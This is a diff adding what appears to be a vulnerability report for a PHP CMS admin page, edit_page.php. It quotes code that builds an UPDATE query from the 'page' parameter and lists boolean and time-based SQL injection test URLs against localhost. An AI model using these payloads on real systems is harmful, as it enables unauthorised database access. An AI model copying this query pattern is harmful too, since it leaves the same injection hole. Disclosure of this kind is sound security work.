@@ -1,0 +1,63 @@
+affected source code file: /admin/edit_page.php
+
+affected source code:
+
+  <?php
+    include ("includes/headerRefresh.php");
+    include ("includes/config.php");
+    include ("functions/functions.php");
+    require_once ("includes/session.php");
+    check_login();
+    ?>
+    <?php if (intval($_GET['page']) == 0) {
+        redirect_to("manage_pages.php");
+    } ?>
+    <?php get_settings(); ?>
+    <?php include ("header.php") ?>
+    <?php
+    $errors = array();
+    if (isset($_POST['submit'])) {
+        if ($_POST['title'] == "")
+            $errors['title'] = "Title of the Page is required !";
+        if ($_POST['menu_name'] == "")
+            $errors['menu_name'] = "Menu name of the Page is required !";
+        if ($_POST['position'] == "")
+            $errors['position'] = "Position of the Page is required !";
+        if (empty($errors)) {
+            $id = mysql_prep($_GET['page']);
+            $title = mysql_prep($_POST['title']);
+            $keywords = mysql_prep($_POST['keywords']);
+            $description = mysql_prep($_POST['description']);
+            $menu_name = mysql_prep($_POST['menu_name']);
+            $position = mysql_prep($_POST['position']);
+            $active = mysql_prep($_POST['active']);
+            $home_page = mysql_prep($_POST['home_page']);
+            if ($home_page == 1) {
+                $query = "UPDATE pages SET home_page = DEFAULT(home_page)";
+                $result = mysql_query($query);
+                confirm_query($result);
+
+            }
+            $contact_form = mysql_prep($_POST['contact_form']);
+            if ($contact_form == 1) {
+                $query = "UPDATE pages SET contact_form = DEFAULT(contact_form)";
+                $result = mysql_query($query);
+                confirm_query($result);
+
+            }
+            $sidebar = mysql_prep($_POST['sidebar']);
+            $sidebar_align = mysql_prep($_POST['sidebar_align']);
+
+            $query = "UPDATE pages SET title = '{$title}', keywords = '{$keywords}', description = '{$description}', menu_name = '{$menu_name}', position = '{$position}', active = '{$active}', home_page = '{$home_page}', sidebar = '{$sidebar}', sidebar_align = '{$sidebar_align}', contact_form = '{$contact_form}' WHERE id = '{$id}'";
+    .......
+  ?>
+
+affected position: 
+  
+  $query = "UPDATE pages SET title = '{$title}', keywords = '{$keywords}', description = '{$description}', menu_name = '{$menu_name}', position = '{$position}', active = '{$active}', home_page = '{$home_page}', sidebar = '{$sidebar}', sidebar_align = '{$sidebar_align}', contact_form = '{$contact_form}' WHERE id = '{$id}'";    
+  The "page" parameter has not been safely processed. SQL injection can be achieved by constructing SQL injection statements.
+      
+affected executable: 
+  Like this: http://127.0.0.1/cms/1/admin/edit_page.php?page=2 and 1=1
+             http://127.0.0.1/cms/1/admin/edit_page.php?page=2 and 1=2
+             http://127.0.0.1/cms/1/admin/edit_page.php?page=2 RLIKE SLEEP(2)
